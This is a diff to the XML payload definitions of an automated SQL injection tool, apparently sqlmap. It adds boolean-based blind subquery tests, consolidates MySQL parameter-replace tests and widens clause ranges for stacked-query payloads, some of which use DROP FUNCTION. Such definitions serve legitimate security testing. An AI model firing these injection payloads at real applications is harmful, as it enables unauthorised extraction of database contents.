@@ -160,7 +160,7 @@ Tag: <test>
         <stype>1</stype>
         <level>1</level>
         <risk>1</risk>
-        <clause>1,9</clause>
+        <clause>1,8,9</clause>
         <where>1</where>
         <vector>AND [INFERENCE]</vector>
         <request>
@@ -204,7 +204,41 @@ Tag: <test>
     </test>
 
     <test>
-        <title>AND boolean-based blind - WHERE or HAVING clause (Generic comment)</title>
+        <title>AND boolean-based blind - WHERE or HAVING clause (subquery - comment)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</payload>
+            <comment>[GENERIC_SQL_COMMENT]</comment>
+        </request>
+        <response>
+            <comparison>AND [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>OR boolean-based blind - WHERE or HAVING clause (subquery - comment)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</payload>
+            <comment>[GENERIC_SQL_COMMENT]</comment>
+        </request>
+        <response>
+            <comparison>OR [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>AND boolean-based blind - WHERE or HAVING clause (comment)</title>
         <stype>1</stype>
         <level>2</level>
         <risk>1</risk>
@@ -221,7 +255,7 @@ Tag: <test>
     </test>
 
     <test>
-        <title>OR boolean-based blind - WHERE or HAVING clause (Generic comment)</title>
+        <title>OR boolean-based blind - WHERE or HAVING clause (comment)</title>
         <stype>1</stype>
         <level>2</level>
         <risk>3</risk>
@@ -238,7 +272,7 @@ Tag: <test>
     </test>
 
     <test>
-        <title>OR boolean-based blind - WHERE or HAVING clause (Generic comment) (NOT)</title>
+        <title>OR boolean-based blind - WHERE or HAVING clause (NOT - comment)</title>
         <stype>1</stype>
         <level>4</level>
         <risk>3</risk>
@@ -295,7 +329,7 @@ Tag: <test>
     </test>
 
     <test>
-        <title>OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)</title>
+        <title>OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</title>
         <stype>1</stype>
         <level>3</level>
         <risk>3</risk>
@@ -378,7 +412,7 @@ Tag: <test>
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
-        <clause>1,2,3</clause>
+        <clause>1,2,3,8</clause>
         <where>1</where>
         <vector>AND MAKE_SET([INFERENCE],[RANDNUM])</vector>
         <request>
@@ -416,7 +450,7 @@ Tag: <test>
         <stype>1</stype>
         <level>4</level>
         <risk>1</risk>
-        <clause>1,2,3</clause>
+        <clause>1,2,3,8</clause>
         <where>1</where>
         <vector>AND ELT([INFERENCE],[RANDNUM])</vector>
         <request>
@@ -454,7 +488,7 @@ Tag: <test>
         <stype>1</stype>
         <level>5</level>
         <risk>1</risk>
-        <clause>1,2,3</clause>
+        <clause>1,2,3,8</clause>
         <where>1</where>
         <vector>AND ([INFERENCE])*[RANDNUM]</vector>
         <request>
@@ -492,7 +526,7 @@ Tag: <test>
         <stype>1</stype>
         <level>2</level>
         <risk>1</risk>
-        <clause>1</clause>
+        <clause>1,8</clause>
         <where>1</where>
         <vector>AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL</vector>
         <request>
@@ -566,83 +600,19 @@ Tag: <test>
 
     <!-- Boolean-based blind tests - Parameter replace -->
     <test>
-        <title>MySQL &gt;= 5.0 boolean-based blind - Parameter replace</title>
+        <title>Boolean-based blind - Parameter replace (original value)</title>
         <stype>1</stype>
         <level>1</level>
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</vector>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</comparison>
         </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.0</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &gt;= 5.0 boolean-based blind - Parameter replace (original value)</title>
-        <stype>1</stype>
-        <level>2</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
-        <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
-        </request>
-        <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.0</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &lt; 5.0 boolean-based blind - Parameter replace</title>
-        <stype>1</stype>
-        <level>2</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
-        <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
-        </request>
-        <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&lt; 5.0</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &lt; 5.0 boolean-based blind - Parameter replace (original value)</title>
-        <stype>1</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
-        <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
-        </request>
-        <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&lt; 5.0</dbms_version>
-        </details>
     </test>
 
     <test>
@@ -1011,7 +981,7 @@ Tag: <test>
     </test>
 
     <test>
-        <title>Boolean-based blind - Parameter replace (DUAL) (original value)</title>
+        <title>Boolean-based blind - Parameter replace (DUAL - original value)</title>
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
@@ -1045,7 +1015,7 @@ Tag: <test>
     </test>
 
     <test>
-        <title>Boolean-based blind - Parameter replace (CASE) (original value)</title>
+        <title>Boolean-based blind - Parameter replace (CASE - original value)</title>
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
@@ -1386,7 +1356,7 @@ Tag: <test>
         <stype>1</stype>
         <level>4</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)</vector>
         <request>
@@ -1407,7 +1377,7 @@ Tag: <test>
         <stype>1</stype>
         <level>5</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)</vector>
         <request>
@@ -1428,7 +1398,7 @@ Tag: <test>
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)</vector>
         <request>
@@ -1449,7 +1419,7 @@ Tag: <test>
         <stype>1</stype>
         <level>5</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1</vector>
         <request>
@@ -1469,7 +1439,7 @@ Tag: <test>
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;IF([INFERENCE]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]</vector>
         <request>
@@ -1491,7 +1461,7 @@ Tag: <test>
         <stype>1</stype>
         <level>4</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)</vector>
         <request>
@@ -1513,7 +1483,7 @@ Tag: <test>
         <stype>1</stype>
         <level>4</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL</vector>
         <request>
@@ -1533,7 +1503,7 @@ Tag: <test>
         <stype>1</stype>
         <level>5</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;IIF([INFERENCE],1,1/0)</vector>
         <request>
@@ -1553,7 +1523,7 @@ Tag: <test>
         <stype>1</stype>
         <level>5</level>
         <risk>1</risk>
-        <clause>0</clause>
+        <clause>1-8</clause>
         <where>1</where>
         <vector>;SELECT CASE WHEN [INFERENCE] THEN 1 ELSE NULL END</vector>
         <request>
